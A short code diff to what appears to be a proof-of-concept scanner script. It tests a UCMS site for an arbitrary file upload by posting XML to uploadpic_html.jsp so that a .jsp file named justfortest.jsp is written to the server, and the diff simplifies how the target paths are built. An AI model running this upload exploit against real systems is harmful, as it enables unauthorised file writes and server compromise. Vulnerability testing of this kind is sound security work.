@@ -28,14 +28,8 @@ class POC(Script):
             dGVzdCBieSBtZQ==
             </root>
             '''
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, '../ucms/'),
-                self.url_normpath(self.url, 'ucms/'),
-                self.url_normpath(self.url, '../ucms/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.base_url, ['./ucms/', './']):
                     myurl = path + 'cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
                     async with session.post(url=myurl, data=xmldata) as res:
                         if res != None and res.status == 200:
